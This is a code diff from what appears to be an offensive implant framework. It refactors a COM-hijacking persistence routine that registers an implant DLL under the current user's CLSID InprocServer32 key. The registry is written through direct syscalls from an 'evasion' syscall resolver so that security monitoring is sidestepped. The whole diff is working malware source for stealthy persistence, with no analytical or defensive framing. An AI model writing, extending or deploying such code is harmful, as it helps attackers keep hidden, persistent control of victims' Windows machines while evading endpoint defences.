@@ -10,51 +10,43 @@
 namespace persistence {
 
 namespace {
-    NTSTATUS NtCreateKeyRecursive(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, const std::wstring& fullPath) {
+    NTSTATUS NtCreateKeyRelative(HANDLE hRoot, const std::wstring& relativePath, PHANDLE hTarget) {
         auto& resolver = evasion::SyscallResolver::GetInstance();
         DWORD ntCreateKeySsn = resolver.GetServiceNumber("NtCreateKey");
         DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
 
         if (ntCreateKeySsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return (NTSTATUS)0xC0000001;
 
-        std::wstringstream ss(fullPath);
+        std::wstringstream ss(relativePath);
         std::wstring segment;
-        std::wstring currentPath = L"";
-        HANDLE hParent = NULL;
+        HANDLE hParent = hRoot;
+        HANDLE hNew = NULL;
         NTSTATUS status = 0;
 
-        // Skip initial empty segments if path starts with \
-        // e.g. \Registry\User\...
-        bool first = true;
-
         while (std::getline(ss, segment, L'\\')) {
-            if (segment.empty() && first) {
-                currentPath = L"\\";
-                first = false;
-                continue;
-            }
-            if (currentPath != L"\\") currentPath += L"\\";
-            currentPath += segment;
+            if (segment.empty()) continue;
 
-            UNICODE_STRING uPath;
-            uPath.Buffer = (PWSTR)currentPath.c_str();
-            uPath.Length = (USHORT)(currentPath.length() * sizeof(wchar_t));
-            uPath.MaximumLength = uPath.Length + sizeof(wchar_t);
+            UNICODE_STRING uSegment;
+            uSegment.Buffer = (PWSTR)segment.c_str();
+            uSegment.Length = (USHORT)(segment.length() * sizeof(wchar_t));
+            uSegment.MaximumLength = uSegment.Length + sizeof(wchar_t);
 
             OBJECT_ATTRIBUTES objAttr;
-            InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+            InitializeObjectAttributes(&objAttr, &uSegment, OBJ_CASE_INSENSITIVE, hParent, NULL);
 
-            HANDLE hKey = NULL;
             ULONG disp = 0;
-            status = InternalDoSyscall(ntCreateKeySsn, &hKey, (PVOID)(UINT_PTR)DesiredAccess, &objAttr, 0, NULL, 0, &disp, NULL, NULL, NULL, NULL);
+            status = InternalDoSyscall(ntCreateKeySsn, &hNew, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, 0, NULL, 0, &disp, NULL, NULL, NULL, NULL);
 
-            if (hParent) InternalDoSyscall(ntCloseSsn, hParent, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+            // Close intermediate handle, but not the initial hRoot
+            if (hParent != hRoot && hParent != NULL) {
+                InternalDoSyscall(ntCloseSsn, hParent, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+            }
 
             if (!NT_SUCCESS(status)) return status;
-            hParent = hKey;
+            hParent = hNew;
         }
 
-        *KeyHandle = hParent;
+        *hTarget = hParent;
         return status;
     }
 }
@@ -68,21 +60,44 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
         return false;
     }
 
-    // Full NT path for HKCU\Software\Classes\CLSID\{...}\InprocServer32
-    // Registry path: \Registry\User\<SID>\Software\Classes\CLSID\<CLSID>\InprocServer32
-    std::wstring fullPath = L"\\Registry\\User\\" + sid + L"\\Software\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";
-
-    LOG_DEBUG("Target NT Path: " + utils::ws2s(fullPath));
-
     auto& resolver = evasion::SyscallResolver::GetInstance();
+    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
     DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
     DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
 
+    if (ntOpenKeySsn == 0xFFFFFFFF || ntSetValueKeySsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) {
+        LOG_ERR("Failed to resolve syscalls for ComHijacker");
+        return false;
+    }
+
+    // Open HKCU root (NT path: \Registry\User\<SID>)
+    std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
+    UNICODE_STRING uHkcu;
+    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
+    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
+    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);
+
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    HANDLE hHkcu = NULL;
+    // Note: Use KEY_CREATE_SUB_KEY or KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE
+    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+
+    if (!NT_SUCCESS(status)) {
+        LOG_ERR("Failed to open HKCU root: 0x" + utils::Shared::ToHex((unsigned int)status));
+        return false;
+    }
+
+    std::wstring relativePath = L"Software\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";
     HANDLE hKey = NULL;
-    NTSTATUS status = NtCreateKeyRecursive(&hKey, KEY_ALL_ACCESS, fullPath);
+    status = NtCreateKeyRelative(hHkcu, relativePath, &hKey);
+
+    // Close HKCU root handle
+    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 
     if (NT_SUCCESS(status)) {
-        LOG_DEBUG("NtCreateKeyRecursive successful");
+        LOG_DEBUG("NtCreateKeyRelative successful");
 
         // Set default value (implant path)
         UNICODE_STRING uEmpty = {0, 0, NULL};
@@ -102,9 +117,7 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
         LOG_INFO("COM registration keys set via direct syscalls.");
         return true;
     } else {
-        char buf[32];
-        std::snprintf(buf, sizeof(buf), "0x%08X", (unsigned int)status);
-        LOG_ERR("NtCreateKeyRecursive failed: " + std::string(buf));
+        LOG_ERR("NtCreateKeyRelative failed: 0x" + utils::Shared::ToHex((unsigned int)status));
     }
 
     return false;
